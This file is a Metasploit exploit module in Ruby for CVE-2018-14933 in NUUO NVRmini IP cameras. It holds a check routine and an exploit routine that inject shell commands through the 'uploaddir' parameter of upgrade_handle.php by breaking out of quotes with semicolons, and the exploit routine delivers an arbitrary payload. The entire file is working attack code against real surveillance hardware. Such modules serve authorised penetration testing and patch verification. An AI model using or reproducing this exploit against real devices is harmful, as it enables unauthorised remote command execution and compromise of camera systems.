# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;        => &#039;NUUO NVRmini upgrade_handle.php Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
        This exploits a vulnerability in the web application of NUUO NVRmini IP camera,
        which can be done by triggering the writeuploaddir command in the upgrade_handle.php file.
      },
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039;  =>
        [
          &#039;Berk Dusunur&#039;, # @berkdusunur
          &#039;numan turle&#039;   # @numanturle
        ],
      &#039;References&#039; =>
        [
          [&#039;URL&#039;, &#039;https://www.berkdusunur.net/2018/11/development-of-metasploit-module-after.html&#039;],
          [&#039;URL&#039;, &#039;https://www.tenable.com/security/research/tra-2018-41&#039;],
          [&#039;CVE&#039;, &#039;2018-14933&#039;],
          [&#039;EDB&#039;, &#039;45070&#039;]
        ],
      &#039;Privileged&#039;   => false,
      &#039;Payload&#039;      =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => %w{ unix win linux },
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [ [&#039;NUUO NVRmini&#039;, { }], ],
      &#039;DisclosureDate&#039; => &#039;Aug 04 2018&#039;,
      &#039;DefaultTarget&#039;  => 0))
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;upgrade_handle.php&#039;),
      &#039;vars_get&#039; =>
        {
          &#039;cmd&#039; => &#039;writeuploaddir&#039;,
          &#039;uploaddir&#039; => "&#039;;echo &#039;#{Rex::Text.rand_text_alphanumeric(10..15)}&#039;;&#039;"
        }}
      )

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res.code == 200 && res.body =~ /upload_tmp_dir/
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end

  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s, "upgrade_handle.php")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      =>  uri,
      &#039;vars_get&#039; =>
        {
          &#039;cmd&#039; => &#039;writeuploaddir&#039;,
          &#039;uploaddir&#039; => "&#039;;"+cmd+";&#039;"
        }}
      )

    unless res
      fail_with(Failure::Unknown, &#039;Failed to execute the command.&#039;)
    end

    res
  end

  def exploit
    http_send_command(payload.encoded)
  end
end

